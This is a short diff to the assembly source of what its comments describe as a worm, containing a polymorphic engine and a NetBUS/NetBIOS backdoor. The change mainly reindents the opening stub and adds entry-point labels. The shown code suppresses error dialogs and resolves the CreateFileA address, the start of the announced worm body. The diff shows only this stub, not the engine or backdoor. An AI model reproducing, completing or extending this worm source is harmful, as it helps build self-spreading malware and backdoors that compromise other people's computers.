@@ -173,18 +173,20 @@ END_NEWS_MESSAGE:
 ;; Begin of real horror... This section contains all the worm body 
 ;; that includes thze polymorphic engine and the 31st technique as well
 ;; as thze NetBUS/NezBIOS backdoor. Have fun :D
-.CODE
-DB          "[-T2IR-]"", 0
-PUSH        SEM_NOGPFAULTERRORBOX   ;; On error, just swim further
-CALL        SetErrorMode            ;; Whithout having a junk
+                .CODE
+                DB          "[-T2IR-]"", 0
+START:
+                PUSH        SEM_NOGPFAULTERRORBOX   ;; On error, just swim further
+                CALL        SetErrorMode            ;; Whithout having a junk
 
-PUSH        0
-PUSH        0
-PUSH        0
-PUSH        0
-PUSH        0
-CALL        PeekMessageA
+                PUSH        0
+                PUSH        0
+                PUSH        0
+                PUSH        0
+                PUSH        0
+                CALL        PeekMessageA
 
-;; Get the real offset from CreateFileA in the jmp-table
-MOV         ESI, DWORD PTR CreateFileA+2
-LODSD
+                ;; Get the real offset from CreateFileA in the jmp-table
+                MOV         ESI, DWORD PTR CreateFileA+2
+                LODSD
+END START
